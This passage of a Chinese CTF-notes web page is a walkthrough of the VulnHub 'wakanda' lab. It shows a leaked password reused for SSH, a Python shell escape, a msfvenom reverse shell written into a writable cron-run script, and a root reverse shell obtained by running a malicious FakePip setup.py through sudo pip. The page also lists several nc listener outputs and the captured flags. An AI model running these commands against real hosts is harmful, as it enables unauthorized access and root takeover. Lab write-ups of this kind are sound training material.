+          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;
+            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;
+            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;
+          &lt;/nav&gt;
+        &lt;/div&gt;
+      &lt;/header&gt;
+
+      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;
+        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;
+        &lt;p class=&quot;lead&quot;&gt;
+          &lt;?php
+            if (isset($_GET[&apos;lang&apos;]))
+          {
+          echo $message;
+          }
+          else
+          {
+            ?&gt;
+
+            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
+            &lt;?php
+          }
+?&gt;
+        &lt;/p&gt;
+        &lt;p class=&quot;lead&quot;&gt;
+          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;Learn more&lt;/a&gt;
+        &lt;/p&gt;
+      &lt;/main&gt;
+
+      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;
+        &lt;div class=&quot;inner&quot;&gt;
+          &lt;p&gt;Made by&lt;a href=&quot;#&quot;&gt;@mamadou&lt;/a&gt;&lt;/p&gt;
+        &lt;/div&gt;
+      &lt;/footer&gt;
+    &lt;/div&gt;
+
+
+
+
+
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<pre><code class="lang-php"><span class="hljs-comment">//fr.php</span>
+<span class="hljs-meta">&lt;?php</span>
+
+$message=<span class="hljs-string">&quot;Prochaine ouverture du plus grand march&#xE9; du vibranium. Les produits viennent directement du wakanda. Restez &#xE0; l&apos;&#xE9;coute!&quot;</span>
+</code></pre>
+<p>&#x62FF;&#x5230;&#x4E00;&#x4E2A;&#x4E0D;&#x77E5;&#x9053;&#x7528;&#x5728;&#x54EA;&#x7684;&#x5BC6;&#x7801;</p>
+<pre><code class="lang-php">$password =<span class="hljs-string">&quot;Niamey4Ever227!!!&quot;</span> ;<span class="hljs-comment">//I have to remember it</span>
+</code></pre>
+<p>&#x8BD5;&#x4E00;&#x4E0B;ssh(nmap&#x4E2D;&#x626B;&#x51FA;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x662F;3333)</p>
+<p>&#x6210;&#x529F;&#x8FDE;&#x4E0A;&#x53BB;&#x4E86;</p>
+<p>&#x53D1;&#x73B0;&#x662F;&#x4E2A;python&#x547D;&#x4EE4;&#x884C;</p>
+<p>&#x62FF;&#x5230;&#x7B2C;&#x4E00;&#x4E2A;flag</p>
+<pre><code>You are now leaving help and returning to the Python interpreter.     
+If you want to ask for help on a particular object directly from the  
+interpreter, you can type &quot;help(object)&quot;.  Executing &quot;help(&apos;string&apos;)&quot; 
+has the same effect as typing a particular string at the help&gt; prompt.
+&gt;&gt;&gt; os.system(&quot;ls&quot;)                                                   
+Traceback (most recent call last):                                    
+  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;                                 
+NameError: name &apos;os&apos; is not defined                                   
+&gt;&gt;&gt; import os                                                         
+&gt;&gt;&gt; os.system(&quot;ls&quot;)                                                   
+flag1.txt                                                             
+0                                                                     
+&gt;&gt;&gt; os.system(&quot;cat fla*&quot;)                                             
+
+Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc                               
+0
+</code></pre><p>&#x6216;&#x8005;&#x4E5F;&#x53EF;&#x5229;&#x7528;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x5207;&#x6362;&#x5230;&#x719F;&#x6089;&#x7684;bash&#x73AF;&#x5883;</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> pty
+pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)
+</code></pre>
+<p>&#x9057;&#x61BE;&#x7684;&#x662F;&#x8FD9;&#x4E2A;&#x7528;&#x6237;&#x5E76;&#x4E0D;&#x80FD;sudo</p>
+<pre><code>mamadou@Wakanda1:~$ sudo -l
+[sudo] password for mamadou:
+Sorry, user mamadou may not run sudo on Wakanda1.
+</code></pre><p>/home&#x76EE;&#x5F55;&#x4E0B;&#x8FD8;&#x6709;&#x4E2A;&#x7528;&#x6237;devops</p>
+<blockquote>
+<p>Tips:</p>
+<p>&#x53EF;&#x4EE5;&#x5229;&#x7528;</p>
+<pre><code class="lang-bash">find / -user devops 2&gt;/dev/null
+</code></pre>
+<p>&#x5176;&#x4E2D;2&gt;/dev/null&#x662F;&#x4E0D;&#x663E;&#x793A;&#x51FA;&#x9519;&#xFF08;&#x6743;&#x9650;&#x4E0D;&#x8DB3;&#xFF09;&#x7684;&#x63D0;&#x793A;&#x4FE1;&#x606F;</p>
+</blockquote>
+<p>&#x53D1;&#x73B0;/srv/.antivirus.py&#x662F;&#x53EF;&#x5199;&#x7684;</p>
+<p>&#x5982;&#x679C;&#x4F1A;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x7684;&#x5316;&#x5C31;&#x53EF;&#x4EE5;&#x5199;&#x4E2A;&#x53CD;&#x5F39;shell&#x4E86;</p>
+<p>&#x53EF;&#x4EE5;&#x7528;msfvenom&#x81EA;&#x52A8;&#x751F;&#x6210;&#x811A;&#x672C;</p>
+<pre><code class="lang-bash">msfvenom -p cmd/unix/reverse_python lhost=&lt;&#x653B;&#x51FB;&#x673A;&#x7684;&#x5730;&#x5740;&gt; lport=2333 R
+</code></pre>
+<p>&#x5199;&#x5165;&#x4E4B;&#x540E;&#x8FC7;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x6211;&#x4EEC;&#x5C31;&#x80FD;&#x8FDE;&#x4E0A;&#x4E3B;&#x673A;&#x4E86;&#xFF08;&#x4EE5;devops&#x7684;&#x8EAB;&#x4EFD;</p>
+<pre><code class="lang-bash">nc -lvp 2333
+listening on [any] 2333 ... 
+192.168.31.154: inverse host lookup failed: Unknown host
+connect to [192.168.31.51] from (UNKNOWN) [192.168.31.154] 34839
+j
+/bin/bash: line 1: j: <span class="hljs-built_in">command</span> not found
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+</code></pre>
+<p>&#x5728;/home/devops&#x4E0B;&#x62FF;&#x5230;flag2.txt</p>
+<p>&#x6700;&#x540E;&#x4E00;&#x6B65;&#x5C31;&#x662F;&#x63D0;&#x6743;&#x5230;root&#x4E86;</p>
+<pre><code>sudo -l 
+Matching Defaults entries for devops on Wakanda1:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User devops may run the following commands on Wakanda1:
+    (ALL) NOPASSWD: /usr/bin/pip
+</code></pre><p>sudo -l&#x53D1;&#x73B0;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; /usr/bin/pip</p>
+<p>&#x5173;&#x4E8E;&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;</p>
+<p>&#x6709;Fakepip&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x53EF;&#x4EE5;&#x5229;&#x7528;</p>
+<pre><code>root@kali:~# git clone https://github.com/0x00-0x00/FakePip.git
+Cloning into &apos;FakePip&apos;...
+remote: Enumerating objects: 23, done.
+remote: Total 23 (delta 0), reused 0 (delta 0), pack-reused 23
+Unpacking objects: 100% (23/23), done.
+root@kali:~# cd FakePip/
+root@kali:~/FakePip# vim setup.py
+</code></pre><p>&#x56E0;&#x4E3A;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6CA1;&#x6709;git,&#x6839;&#x636E;&#x5BF9;&#x5E94;&#x5730;&#x5740;&#x4FEE;&#x6539;&#x811A;&#x672C;&#x7136;&#x540E;&#x518D;&#x5229;&#x7528;&#x653B;&#x51FB;&#x673A;&#x7684;web&#x670D;&#x52A1;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E0A;</p>
+<pre><code>root@kali:~/FakePip# python -m SimpleHTTPServer 80
+
+wget &lt;&#x653B;&#x51FB;&#x673A;&#x5730;&#x5740;&gt;/setup.py
+</code></pre><p>&#x6216;&#x8005;&#x4E5F;&#x53EF;&#x4EE5;&#x590D;&#x5236;&#x811A;&#x672C;&#x5185;&#x5BB9;&#x201C;&#x624B;&#x5DE5;&#x4E0A;&#x4F20;&#x201D;&#x5230;&#x9776;&#x673A;&#x4E0A;</p>
+<p>&#x5229;&#x7528;exp&#x63D0;&#x4F9B;&#x7684;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;root&#x7684;&#x53CD;&#x5F39;shell</p>
+<pre><code class="lang-bash">sudo /usr/bin/pip install . --upgrade --force-reinstall
+Unpacking /home/devops
+  Running setup.py (path:/tmp/pip-GX4_KQ-build/setup.py) egg_info <span class="hljs-keyword">for</span> package from file:///home
+
+Installing collected packages: FakePip
+  Found existing installation: FakePip 0.0.1
+    Uninstalling FakePip:
+      Successfully uninstalled FakePip
+  Running setup.py install <span class="hljs-keyword">for</span> FakePip
+
+nc -lvp 13372 <span class="hljs-comment">#&#x653B;&#x51FB;&#x673A;</span>
+listening on [any] 13372 ...
+192.168.31.154: inverse host lookup failed: Unknown host
+connect to [192.168.31.51] from (UNKNOWN) [192.168.31.154] 35263
+root@Wakanda1:/tmp/pip-GX4_KQ-build<span class="hljs-comment"># cat /root/root.txt</span>
+</code></pre>
+<p>&#x63D0;&#x6743;&#x6210;&#x529F; </p>
+<footer class="page-footer"><span class="copyright">&#xA9; Eki&apos;s CTF-notes 2019-2021 CC-by-nc-sa 4.0&#x3002; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x672C;&#x7F51;&#x7AD9;&#x6700;&#x540E;&#x4FEE;&#x8BA2;&#x4E8E;&#xFF1A;
+2021-05-07 16:30:35
+</span></footer> <link rel="stylesheet" type="text/css" href="https://storage.googleapis.com/app.klipse.tech/css/codemirror.css"> <script>     window.klipse_settings = {         selector: ".language-klipse, .lang-eval-clojure",         selector_eval_js: ".lang-eval-js",         selector_eval_python_client: ".lang-eval-python",         selector_eval_php: ".lang-eval-php",         selector_eval_scheme: ".lang-eval-scheme",         selector_eval_ruby: ".lang-eval-ruby",         selector_reagent: ".lang-reagent",        selector_google_charts: ".lang-google-chart",        selector_es2017: ".lang-eval-es2017",        selector_jsx: ".lang-eval-jsx",        selector_transpile_jsx: ".lang-transpile-jsx",        selector_render_jsx: ".lang-render-jsx",        selector_react: ".lang-react",        selector_eval_markdown: ".lang-render-markdown",        selector_eval_lambdaway: ".lang-render-lambdaway",        selector_eval_cpp: ".lang-eval-cpp",        selector_eval_html: ".lang-render-html",        selector_sql: ".lang-eval-sql",        selector_brainfuck: "lang-eval-brainfuck",        selector_js: ".lang-transpile-cljs"    }; </script> <script src="https://storage.googleapis.com/app.klipse.tech/plugin/js/klipse_plugin.js"></script>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="five86-1.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: five86-1">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"wakanda","level":"1.8.3","depth":2,"previous":{"title":"five86-1","level":"1.8.2","depth":2,"path":"vulnhub/five86-1.md","ref":"vulnhub/five86-1.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","katex","tbfed-pagefooter","theme-comscore","anchor-navigation-ex","-lunr","-search","search-plus","custom-favicon","ga","multipart","advanced-emoji","github","-sharing","sharing-plus","klipse","donate","pageview-count","code","lightbox","auto-scroll-table"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"&copy Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。","modify_label":"本网站最后修订于：","modify_format":"YYYY-MM-DD HH:mm:ss"},"github":{"url":"https://github.com/ekixu"},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"auto-scroll-table":{},"multipart":{},"code":{"copyButtons":true},"donate":{"alipay":"https://ctf.ieki.xyz/assets/images/alipay.jpg","alipayText":"支付宝打赏","button":"赏","title":"","wechat":"https://ctf.ieki.xyz/assets/images/wechat.jpg","wechatText":"微信打赏"},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-navicon","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":"/assets/images/favicon.ico","lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"pageview-count":{},"custom-favicon":{},"ga":{"configuration":"auto","token":"UA-156105693-2"},"klipse":{"myConfigKey":"it's the default value"},"advanced-emoji":{"embedEmojis":false},"sharing":{"qq":false,"all":["douban","facebook","google","instapaper","linkedin","twitter","weibo","messenger","qq","qzone","viber","whatsapp"],"douban":false,"facebook":false,"weibo":true,"twitter":true,"pocket":false,"google":true,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Eki","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Eki's CTF","links":{"sidebar":{"主站 Eki's Blog":"https://ieki.xyz"}},"gitbook":"*","description":"CTF笔记"},"file":{"path":"vulnhub/wakanda.md","mtime":"2021-05-07T08:30:35.941Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-05-07T08:31:26.574Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
